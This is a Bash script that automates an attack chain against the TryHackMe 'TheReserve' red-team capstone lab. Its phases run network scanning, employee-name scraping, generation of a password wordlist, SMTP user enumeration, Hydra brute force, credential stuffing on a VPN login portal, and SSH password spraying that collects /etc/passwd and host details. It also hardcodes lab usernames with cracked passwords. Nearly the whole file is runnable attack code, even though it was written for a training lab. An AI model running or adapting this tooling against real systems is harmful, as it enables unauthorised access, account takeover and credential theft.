#!/bin/bash
# ============================================================
# TheReserve Red Team — Bash Automation Script
# TryHackMe Capstone Challenge | WSL Build
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

# ── Paths ────────────────────────────────────────────────────
BASE="/mnt/c/Users/Lamona/Desktop/redteamcapston/automation"
OUTDIR="$BASE/output"
OVPN="$BASE/redteamcapstonechallenge.ovpn"
KNOWN_CREDS="$OUTDIR/creds_found.txt"

# ── Targets ──────────────────────────────────────────────────
SUBNET="10.200.40"
MAIL_IP="10.200.40.11"
VPN_PORTAL="10.200.40.12"
WEB_IP="10.200.40.13"

mkdir -p "$OUTDIR"

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }

banner() {
  clear
  echo -e "${RED}"
  echo "╔════════════════════════════════════════════════╗"
  echo "║   TheReserve Red Team Automation  — Bash      ║"
  echo "║   TryHackMe Capstone  |  WSL Build            ║"
  echo "╚════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  Base   → ${CYAN}$BASE${NC}"
  echo -e "  Output → ${CYAN}$OUTDIR${NC}"
  echo ""
}

# ════════════════════════════════════════
# PHASE 0 — VPN Check / Auto-Reconnect
# ════════════════════════════════════════
phase0_vpn() {
  echo -e "\n${CYAN}══ PHASE 0: VPN ══${NC}"
  if ip a 2>/dev/null | grep -q "capstone"; then
    MY_IP=$(ip a show capstone 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    log "Already connected → $MY_IP"
    echo "$MY_IP" > "$OUTDIR/my_ip.txt"
    return 0
  fi
  warn "VPN not connected — reconnecting..."
  [[ ! -f "$OVPN" ]] && { err "Missing: $OVPN"; return 1; }
  sudo openvpn --config "$OVPN" --daemon --log "$OUTDIR/vpn.log"
  for i in {1..12}; do
    sleep 2; ip a 2>/dev/null | grep -q "capstone" && break
  done
  if ip a 2>/dev/null | grep -q "capstone"; then
    MY_IP=$(ip a show capstone 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    log "Connected → $MY_IP"; echo "$MY_IP" > "$OUTDIR/my_ip.txt"
  else
    err "VPN failed. See: $OUTDIR/vpn.log"; return 1
  fi
}

# ════════════════════════════════════════
# PHASE 1 — Host Discovery
# ════════════════════════════════════════
phase1_discovery() {
  echo -e "\n${CYAN}══ PHASE 1: Host Discovery ══${NC}"
  info "Sweeping $SUBNET.0/24 ..."
  nmap -sn "$SUBNET.0/24" -oN "$OUTDIR/hosts_up.txt" 2>/dev/null
  grep "report for" "$OUTDIR/hosts_up.txt" | awk '{print $5}' \
    | grep -v "\.250$" > "$OUTDIR/targets.txt"
  log "Live targets:"
  cat "$OUTDIR/targets.txt" | while read h; do echo "    $h"; done
}

# ════════════════════════════════════════
# PHASE 2 — /etc/hosts Setup
# ════════════════════════════════════════
phase2_hosts() {
  echo -e "\n${CYAN}══ PHASE 2: /etc/hosts ══${NC}"
  grep -v "thereserve" /etc/hosts > /tmp/hosts_clean 2>/dev/null
  cat >> /tmp/hosts_clean << 'EOF'
10.200.40.11 MAIL.thereserve.loc mail.thereserve.loc webmail.thereserve.loc thereserve.loc
10.200.40.13 corporate.thereserve.loc
EOF
  sudo cp /tmp/hosts_clean /etc/hosts
  cp /tmp/hosts_clean "$OUTDIR/hosts_backup.txt"
  log "/etc/hosts updated + backed up → $OUTDIR/hosts_backup.txt"
}

# ════════════════════════════════════════
# PHASE 3 — Port Scanning
# ════════════════════════════════════════
phase3_portscan() {
  echo -e "\n${CYAN}══ PHASE 3: Port Scan ══${NC}"
  [[ ! -f "$OUTDIR/targets.txt" ]] && { warn "Run Phase 1 first"; return; }
  while read target; do
    info "Scanning $target ..."
    nmap -sC -sV -p- --min-rate 3000 "$target" \
      -oN "$OUTDIR/scan_${target}.txt" 2>/dev/null
    log "Saved → $OUTDIR/scan_${target}.txt"
  done < "$OUTDIR/targets.txt"
}

# ════════════════════════════════════════
# PHASE 4 — OSINT / Employee Harvest
# ════════════════════════════════════════
phase4_osint() {
  echo -e "\n${CYAN}══ PHASE 4: OSINT ══${NC}"

  info "Harvesting employee list from OctoberCMS images..."
  curl -s "http://$WEB_IP/october/themes/demo/assets/images/" 2>/dev/null \
    | grep -oP '[a-z]+\.[a-z]+(?=\.jpeg)' | sort -u \
    > "$OUTDIR/employee_names.txt"

  if [[ -s "$OUTDIR/employee_names.txt" ]]; then
    log "$(wc -l < "$OUTDIR/employee_names.txt") employees found"
    awk '{print $0 "@corp.thereserve.loc"}' "$OUTDIR/employee_names.txt" \
      > "$OUTDIR/emails.txt"
  else
    warn "Using hardcoded fallback list"
    cat > "$OUTDIR/emails.txt" << 'EOF'
antony.ross@corp.thereserve.loc
ashley.chan@corp.thereserve.loc
brenda.henderson@corp.thereserve.loc
charlene.thomas@corp.thereserve.loc
christopher.smith@corp.thereserve.loc
emily.harvey@corp.thereserve.loc
keith.allen@corp.thereserve.loc
laura.wood@corp.thereserve.loc
leslie.morley@corp.thereserve.loc
lynda.gordon@corp.thereserve.loc
martin.savage@corp.thereserve.loc
mohammad.ahmed@corp.thereserve.loc
paula.bailey@corp.thereserve.loc
rhys.parsons@corp.thereserve.loc
roy.sims@corp.thereserve.loc
EOF
  fi

  sed 's/@corp\.thereserve\.loc//' "$OUTDIR/emails.txt" \
    > "$OUTDIR/usernames_short.txt"

  log "Emails      → $OUTDIR/emails.txt"
  log "Usernames   → $OUTDIR/usernames_short.txt"

  info "Scraping Meet The Team page..."
  curl -s "http://$WEB_IP/october/index.php/demo/meettheteam" \
    | grep -oP '(?<=<p>)[^<]+' > "$OUTDIR/team_info.txt"

  info "Scraping Contact Us page..."
  curl -s "http://$WEB_IP/october/index.php/demo/contactus" \
    | grep -oP 'mailto:[^"]+|<p>[^<]+' > "$OUTDIR/contactus.txt"

  info "Checking VPN config template..."
  curl -s "http://$VPN_PORTAL/vpn/corpUsername.ovpn" \
    -o "$OUTDIR/corpUsername_template.ovpn"
  log "VPN template → $OUTDIR/corpUsername_template.ovpn"
}

# ════════════════════════════════════════
# PHASE 5 — Password List
# ════════════════════════════════════════
phase5_passwords() {
  echo -e "\n${CYAN}══ PHASE 5: Password Generation ══${NC}"
  local bases=("TheReserve" "thereserve" "Reserve" "reserve"
               "CorpTheReserve" "corpthereserve" "Password" "password"
               "TheReserveBank" "thereservebank" "ReserveBank" "reservebank")
  local specials=("!" "@" "#" "$" "%" "^")
  local numbers=("1" "2" "123" "2023" "2024" "1234")
  > "$OUTDIR/passwords.txt"
  for base in "${bases[@]}"; do
    for num in "${numbers[@]}"; do
      for spec in "${specials[@]}"; do
        echo "${base}${num}${spec}"
        echo "${base}${spec}${num}"
        echo "${num}${base}${spec}"
      done
    done
  done >> "$OUTDIR/passwords.txt"
  log "Passwords → $OUTDIR/passwords.txt ($(wc -l < "$OUTDIR/passwords.txt") entries)"
}

# ════════════════════════════════════════
# PHASE 6 — SMTP User Validation
# ════════════════════════════════════════
phase6_smtp_enum() {
  echo -e "\n${CYAN}══ PHASE 6: SMTP User Enum ══${NC}"
  [[ ! -f "$OUTDIR/emails.txt" ]] && { warn "Run Phase 4 first"; return; }
  > "$OUTDIR/valid_users.txt"
  while read email; do
    result=$( (echo "EHLO test"; sleep 0.4; echo "VRFY $email"; sleep 0.4; echo "QUIT") \
      | nc -w 4 "$MAIL_IP" 25 2>/dev/null | tail -3)
    code=$(echo "$result" | grep -oP '^\d{3}' | tail -1)
    if [[ "$code" == "250" || "$code" == "252" ]]; then
      log "VALID: $email"; echo "$email" >> "$OUTDIR/valid_users.txt"
    else
      info "  Skip: $email ($code)"
    fi
  done < "$OUTDIR/emails.txt"
  log "Valid users → $OUTDIR/valid_users.txt"
}

# ════════════════════════════════════════
# PHASE 7 — SMTP Brute Force
# ════════════════════════════════════════
phase7_smtp_brute() {
  echo -e "\n${CYAN}══ PHASE 7: SMTP Brute Force ══${NC}"
  local ufile="$OUTDIR/emails.txt"
  [[ -s "$OUTDIR/valid_users.txt" ]] && ufile="$OUTDIR/valid_users.txt"
  info "$(wc -l < "$ufile") users × $(wc -l < "$OUTDIR/passwords.txt") passwords"
  hydra -L "$ufile" -P "$OUTDIR/passwords.txt" \
        "$MAIL_IP" smtp -t 8 -I \
        -o "$OUTDIR/smtp_hydra_raw.txt" 2>/dev/null

  > "$KNOWN_CREDS"
  if grep -q "login:" "$OUTDIR/smtp_hydra_raw.txt" 2>/dev/null; then
    grep "login:" "$OUTDIR/smtp_hydra_raw.txt" | while read line; do
      u=$(echo "$line" | grep -oP 'login: \K\S+')
      p=$(echo "$line" | grep -oP 'password: \K\S+')
      echo "$u:$p" >> "$KNOWN_CREDS"
      log "FOUND: $u → $p"
    done
  else
    warn "Hydra found nothing — loading known fallback creds"
    cat > "$KNOWN_CREDS" << 'EOF'
keith.allen@corp.thereserve.loc:Password123!
laura.wood@corp.thereserve.loc:Password1@
lynda.gordon@corp.thereserve.loc:thereserve2023!
mohammad.ahmed@corp.thereserve.loc:Password1!
EOF
  fi
  log "Creds → $KNOWN_CREDS"
}

# ════════════════════════════════════════
# PHASE 8 — VPN Portal Attack
# ════════════════════════════════════════
phase8_vpn_portal() {
  echo -e "\n${CYAN}══ PHASE 8: VPN Portal ══${NC}"
  info "Trying known creds on VPN portal..."
  > "$OUTDIR/vpn_portal_valid.txt"
  while IFS=: read user pass; do
    short=$(echo "$user" | cut -d@ -f1)
    jar="$OUTDIR/cookie_${short}.jar"
    result=$(curl -s -c "$jar" \
      "http://$VPN_PORTAL/login.php?user=${short}&password=${pass}")
    if ! echo "$result" | grep -q "Login Failed"; then
      log "Portal SUCCESS: $short / $pass"
      echo "$short:$pass" >> "$OUTDIR/vpn_portal_valid.txt"
      curl -s -b "$jar" "http://$VPN_PORTAL/upload.php" \
        -o "$OUTDIR/vpn_upload_${short}.html"
      curl -s -b "$jar" "http://$VPN_PORTAL/vpn/" \
        -o "$OUTDIR/vpn_dir_${short}.html"
      log "Portal pages saved for $short"
    else
      info "  Failed: $short"
    fi
  done < "$KNOWN_CREDS"
  [[ -s "$OUTDIR/vpn_portal_valid.txt" ]] \
    && log "Valid portal logins → $OUTDIR/vpn_portal_valid.txt" \
    || warn "No portal access yet"
}

# ════════════════════════════════════════
# PHASE 9 — SSH Access
# ════════════════════════════════════════
phase9_ssh() {
  echo -e "\n${CYAN}══ PHASE 9: SSH Access ══${NC}"
  [[ ! -f "$KNOWN_CREDS" ]] && { warn "No creds — run Phase 7"; return; }
  [[ ! -f "$OUTDIR/targets.txt" ]] && { warn "No targets — run Phase 1"; return; }
  > "$OUTDIR/ssh_valid.txt"
  > "$OUTDIR/ssh_loot.txt"
  while read target; do
    while IFS=: read user pass; do
      short=$(echo "$user" | cut -d@ -f1)
      out=$(sshpass -p "$pass" ssh \
        -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "${short}@${target}" "whoami && id && hostname" 2>&1)
      if echo "$out" | grep -qiE "^root$|^lynda|^keith|^laura|^mohammad"; then
        log "SSH: ${short}@${target}"
        echo "${short}:${pass}@${target}" >> "$OUTDIR/ssh_valid.txt"
        { echo "=== ${short}@${target} ==="; echo "$out";
          sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
          "${short}@${target}" \
          "ip a 2>/dev/null || ipconfig 2>/dev/null; ls /home/; \
           cat /etc/passwd 2>/dev/null | head -20" 2>/dev/null;
        } >> "$OUTDIR/ssh_loot.txt"
      fi
    done < "$KNOWN_CREDS"
  done < "$OUTDIR/targets.txt"
  log "SSH results → $OUTDIR/ssh_valid.txt"
  log "SSH loot    → $OUTDIR/ssh_loot.txt"
}

# ════════════════════════════════════════
# PHASE 10 — Web Directory Enum
# ════════════════════════════════════════
phase10_webdir() {
  echo -e "\n${CYAN}══ PHASE 10: Web Dir Enum ══${NC}"
  local wl="/usr/share/wordlists/dirb/common.txt"
  declare -A TARGETS=(
    ["vpn_portal"]="http://$VPN_PORTAL/"
    ["mail_iis"]="http://$MAIL_IP/"
    ["october"]="http://$WEB_IP/october/"
    ["webmail"]="http://mail.thereserve.loc/"
  )
  for name in "${!TARGETS[@]}"; do
    info "Gobuster: $name"
    gobuster dir -u "${TARGETS[$name]}" -w "$wl" -q \
      -x php,aspx,html,txt \
      -o "$OUTDIR/gobuster_${name}.txt" 2>/dev/null
    log "Saved → $OUTDIR/gobuster_${name}.txt"
  done
}

# ════════════════════════════════════════
# SUMMARY
# ════════════════════════════════════════
summary() {
  echo -e "\n${CYAN}╔══════════════════════════════════════╗"
  echo    "║        ENGAGEMENT SUMMARY            ║"
  echo -e "╚══════════════════════════════════════╝${NC}"
  echo -e "\n  All files in: ${CYAN}$OUTDIR${NC}\n"
  [[ -f "$OUTDIR/hosts_up.txt" ]]    && log "Hosts:    $(grep -c 'report' "$OUTDIR/hosts_up.txt")"
  [[ -f "$OUTDIR/emails.txt" ]]      && log "Emails:   $(wc -l < "$OUTDIR/emails.txt")"
  [[ -f "$OUTDIR/valid_users.txt" ]] && log "Valid:    $(wc -l < "$OUTDIR/valid_users.txt")"
  [[ -f "$KNOWN_CREDS" ]] && {
    log "Creds found:"
    while IFS=: read u p; do echo "    $u : $p"; done < "$KNOWN_CREDS"
  }
  [[ -f "$OUTDIR/ssh_valid.txt" ]]   && log "SSH:      $(wc -l < "$OUTDIR/ssh_valid.txt") host(s)"
  echo ""
  echo -e "${YELLOW}Next:${NC}"
  echo "  → Run the Python script for full mailbox harvest"
  echo "  → Use VPN portal creds to get internal .ovpn"
  echo "  → Submit Flag 1 via e-Citizen SSH"
}

# ════════════════════════════════════════
# MENU
# ════════════════════════════════════════
banner
PS3=$'\n'"Choice: "
select opt in \
  "Full Auto (all phases)" \
  "Quick Recon (0-4)" \
  "Creds Attack (5-8)" \
  "SSH Only" \
  "Web Dir Enum" \
  "Single Phase" \
  "Summary" \
  "Exit"; do
  case $REPLY in
    1) phase0_vpn;phase1_discovery;phase2_hosts;phase3_portscan
       phase4_osint;phase5_passwords;phase6_smtp_enum;phase7_smtp_brute
       phase8_vpn_portal;phase9_ssh;phase10_webdir;summary;;
    2) phase0_vpn;phase1_discovery;phase2_hosts;phase4_osint;summary;;
    3) phase5_passwords;phase7_smtp_brute;phase8_vpn_portal;summary;;
    4) phase9_ssh;summary;;
    5) phase10_webdir;;
    6) printf '\n  0-VPN  1-Discover  2-Hosts  3-Scan  4-OSINT\n'
       printf '  5-Pass 6-SMTPenum  7-Brute  8-Portal 9-SSH  10-Web\n\n'
       read -rp "  Phase: " ph
       case $ph in
         0)phase0_vpn;;1)phase1_discovery;;2)phase2_hosts;;
         3)phase3_portscan;;4)phase4_osint;;5)phase5_passwords;;
         6)phase6_smtp_enum;;7)phase7_smtp_brute;;
         8)phase8_vpn_portal;;9)phase9_ssh;;10)phase10_webdir;;
         *)err "Invalid";;
       esac;;
    7) summary;;
    8) echo "Bye!";exit 0;;
    *) err "Invalid option";;
  esac
  echo ""
done
